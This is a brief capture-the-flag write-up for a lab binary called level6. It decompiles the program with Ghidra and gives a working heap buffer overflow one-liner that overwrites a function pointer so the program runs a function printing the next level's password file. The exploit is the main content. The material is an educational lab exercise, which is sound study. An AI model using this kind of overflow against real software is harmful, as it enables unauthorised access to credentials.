get the binary on host
* `scp -P 4242 level6@192.168.56.107:./level6 ./binary/level6`

decompile using ghidras
```c
            void main(undefined4 param_1,int param_2)
            {
                undefined4 uVar1;
                code **ppcVar2;
                
                uVar1 = malloc(64);
                ppcVar2 = (code **)malloc(4);
                *ppcVar2 = m;
                strcpy(uVar1,*(undefined4 *)(param_2 + 4));
                (**ppcVar2)();
                return;
            }
            void m()
            {
                put("Nope");
            }
/*08048454*/void n(void)
            {
                 system("/bin/cat /home/user/level7/.pass");
                return;
            }
```
We find found the segfault a index 72\
Like before buffer overflow to jump to other function:\
`./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')` 